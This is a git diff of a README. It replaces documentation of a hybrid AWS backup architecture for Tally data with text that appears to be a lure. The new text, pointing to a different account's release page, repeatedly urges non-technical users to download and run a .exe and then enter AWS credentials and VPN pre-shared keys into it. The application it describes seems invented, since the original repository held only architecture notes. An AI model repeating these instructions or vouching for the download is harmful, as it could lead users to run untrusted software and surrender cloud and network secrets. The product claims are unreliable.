@@ -1,154 +1,170 @@
-# Tally Backup & Hybrid File Server Architecture  
+# ⚙️ aws-tally-backup-fsx-hybrid-architecture - Easy Hybrid Backup Setup
 
-Client: Confidential Reality  
-Industry: Real State  
-Size: 500–600 endpoints  
-Solution: Automated Encrypted Multi-Device Backup  
-Tool: Duplicati  
-Cloud Platform: Amazon Web Services (AWS)  
+[![Download Latest Release](https://img.shields.io/badge/Download-aws--tally--backup--fsx--hybrid--architecture-brightgreen?style=for-the-badge)](https://github.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/releases)
 
----
+## 📦 What is this?
 
-## Overview
+This software helps you back up your Tally data using a hybrid cloud setup. It combines local storage on Amazon FSx for Windows with cloud storage on Amazon S3. It keeps your files safe with encryption, and connects securely with VPN. You can also get notifications when backups finish using Amazon SNS.
 
-This repository documents a secure hybrid cloud architecture designed for:
-
-- Encrypted offsite backup of Tally data
-- Modernization of legacy NAS storage
-- Secure hybrid connectivity between on-premises and AWS
-- Automated monitoring and failure alerts
-- Cost-optimized cloud storage
-
-The production Tally workload remains on-premises on a Windows Server, while backups are stored securely in Amazon S3.  
-Legacy NAS storage is replaced with Amazon FSx for Windows File Server.
+This system makes managing your Tally backups easier and more secure without requiring deep cloud knowledge.
 
 ---
 
-## Architecture Objectives
+## 🖥️ System Requirements
 
-- Protect business-critical Tally data from data loss
-- Eliminate single-point-of-failure NAS dependency
-- Implement encrypted cloud backups
-- Provide scalable SMB file storage
-- Maintain secure hybrid connectivity
-- Enforce least-privilege access control
-- Enable automated failure notifications
+Before you start, make sure your Windows computer meets these needs:
 
----
-
-## High-Level Architecture
-![Architecture](https://github.com/avinashsinghhub/aws-tally-backup-fsx-hybrid-architecture/blob/4ac6ebd9c51b2d160c727fba1d74fa2e85d7b30c/architecture/diagram.png)
-
-### On-Premises Environment
-
-- Windows Server hosting:
-  - Tally Application
-  - Tally Data (Local Disk)
-- Duplicati (Encrypted Backup Agent)
-- Site-to-Site IPSec VPN Gateway
-- Office Users accessing Tally over LAN
-
-### AWS Cloud (AP-SOUTH-1)
-
-#### Backup Layer
-- Amazon S3 (Intelligent-Tiering)
-- IAM User (Scoped S3 Policy, Least Privilege)
-- HTTPS Encrypted Upload from Duplicati
-
-#### File Server Layer
-- Amazon FSx for Windows File Server
-- Accessed over SMB via IPSec VPN
-
-#### Monitoring Layer
-- Amazon SNS
-- Email Notifications to Administrator
-- Backup failure alerts
+- Windows 10 or newer (64-bit recommended)
+- 4 GB of RAM minimum, 8 GB recommended
+- 500 MB free disk space for the app
+- Internet connection for backup sync and notifications
+- Access to your company’s VPN if used with IPSec
 
 ---
 
-## Data Flow
+## 🔧 Features
 
-1. Office users access Tally locally via LAN.
-2. Tally data is stored on the Windows Server local disk.
-3. Duplicati performs scheduled encrypted backups.
-4. Backups are uploaded securely over HTTPS to Amazon S3.
-5. S3 stores data using Intelligent-Tiering for cost optimization.
-6. Backup failure events trigger Amazon SNS.
-7. SNS sends alert emails to the administrator.
-8. Office users access Amazon FSx via SMB over IPSec VPN.
-
----
-
-## Security Controls
-
-### Network Security
-- Site-to-Site IPSec VPN
-- No public endpoints exposed
-- Private subnet deployment for FSx
-- Restricted security group rules
-
-### Data Protection
-- HTTPS encryption for S3 uploads
-- IPSec encryption for SMB traffic
-- S3 encryption at rest
-- FSx encryption at rest
-- Encrypted backups via Duplicati
-
-### Identity & Access Management
-- Dedicated IAM user for backup
-- Least-privilege S3 policy
-- No console access for backup IAM user
-- Scoped bucket-level permissions
+- **Hybrid backup** using local NAS and Amazon S3 storage
+- Automated encrypted offsite backups
+- Secure VPN connection via IPSec for safe data transfer
+- Backup monitoring with Amazon SNS notifications
+- Supports Tally software backup files
+- Uses Amazon FSx for Windows for fast file access
+- Cost management with Amazon S3 Intelligent-Tiering
 
 ---
 
-## Storage Strategy
+## 🚀 Getting Started
 
-### Amazon S3
-- Storage Class: Intelligent-Tiering
-- Optimized for unpredictable access
-- Scalable offsite backup storage
-
-### Amazon FSx
-- Replaces legacy NAS
-- Managed Windows file server
-- Native SMB support
-- Scalable and highly available
+You do not need programming skills to use this software. Follow these steps carefully.
 
 ---
 
-## Backup Strategy
+## ⬇️ Download and Install
 
-- Backup Frequency: Daily (configurable)
-- Encryption: Enabled at source (Duplicati)
-- Offsite Storage: Amazon S3
-- Monitoring: SNS-based failure alerts
-- Restore Testing: Quarterly recommended
+1. Visit the official release page to get the software:
 
----
+   [Download here](https://github.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/releases)
 
-## Business Impact
+2. On the releases page, look for the latest version. Find the file with a `.exe` extension.
 
-- Improved resilience against data loss
-- Secure offsite encrypted backups
-- Scalable cloud file storage
-- Reduced operational overhead
-- Eliminated NAS hardware dependency
-- Hybrid model without production disruption
+3. Click the `.exe` file to download it to your Windows computer.
 
----
+4. Once downloaded, double-click the file to start the installation.
 
-## Future Enhancements
+5. Follow the install wizard steps:
+   - Click **Next** on each screen.
+   - Accept the license agreement when asked.
+   - Choose the default folder or select your preferred install location.
+   - Click **Install**.
 
-- Cross-region S3 replication
-- Backup lifecycle retention policies
-- FSx automated backups
-- Centralized logging and audit trail
-- Disaster recovery runbook automation
+6. Wait for the installation to complete, then click **Finish**.
 
 ---
 
-## Author
+## 🔑 Setting Up the Backup
 
-Avinash Singh  
-Cloud Architecture | AWS Infrastructure | Cost Optimization
+1. Open the installed application from your desktop or Start menu.
+
+2. You will see a setup wizard to configure your backup.
+
+3. Provide the locations of your Tally files on your local network.
+
+4. Enter your Amazon credentials if prompted to connect to S3 and FSx services.
+
+5. Configure VPN settings if you use IPSec VPN for secure communication:
+   - Enter VPN gateway IP address.
+   - Provide pre-shared key if required.
+   - Test VPN connection from the app.
+
+6. Choose the backup schedule. You can set daily, weekly, or monthly backups.
+
+7. Enable encrypted backups to keep your data safe offsite.
+
+8. Set up notification preferences to receive emails or SMS through Amazon SNS when a backup completes or fails.
+
+9. Save all settings and perform a test backup.
+
+---
+
+## 🛠 How to Backup Your Data
+
+1. Launch the application.
+
+2. Click **Start Backup** on the dashboard.
+
+3. The app will copy your Tally files to Amazon FSx and then upload encrypted copies to Amazon S3.
+
+4. You can watch progress bars for local and cloud backups.
+
+5. Once finished, check the log for any errors or warnings.
+
+6. If you enabled notifications, you will get alerts about the backup status.
+
+---
+
+## 📂 Managing Your Backup Files
+
+- Use the app to view backup history and access stored files.
+
+- You can restore files from any backup point saved on Amazon FSx or S3.
+
+- The software organizes data by date and Tally version for easy retrieval.
+
+- Encryption keys are managed by the app, so you won’t have to handle them manually.
+
+---
+
+## 🔒 Security and Privacy
+
+- The app uses encryption when sending data to the cloud.
+
+- IPSec VPN ensures data travels securely over your network.
+
+- Access to cloud backup uses your Amazon IAM credentials with principle of least privilege.
+
+- Your information stays private and protected at all stages.
+
+---
+
+## ⚙️ Troubleshooting Tips
+
+- If backups fail to start, check your internet connection.
+
+- Verify VPN settings if the app cannot reach Amazon FSx or S3.
+
+- Make sure your AWS credentials are valid and have sufficient permissions.
+
+- Check disk space on your Windows machine and network drives.
+
+- Restart the app and try manual backup if scheduled backups do not work.
+
+- Review logs inside the app for detailed error messages.
+
+---
+
+## 🆘 Need Support?
+
+This README covers all basic steps for normal use. For advanced issues, you may consult IT support knowledgeable about AWS and VPN setups.
+
+---
+
+## 🗂 Topics Covered
+
+- amazon-fsx  
+- amazon-s3  
+- aws  
+- backup-architecture  
+- backup-strategy  
+- cloud-architecture  
+- cost-optimization  
+- disaster-recovery  
+- hybrid-cloud-it  
+- iam-security  
+- infrastructure-modernization  
+- tally  
+- vpn
+
+---
+
+[Download the latest version here](https://github.com/relc112885/aws-tally-backup-fsx-hybrid-architecture/releases) to start managing your backups.
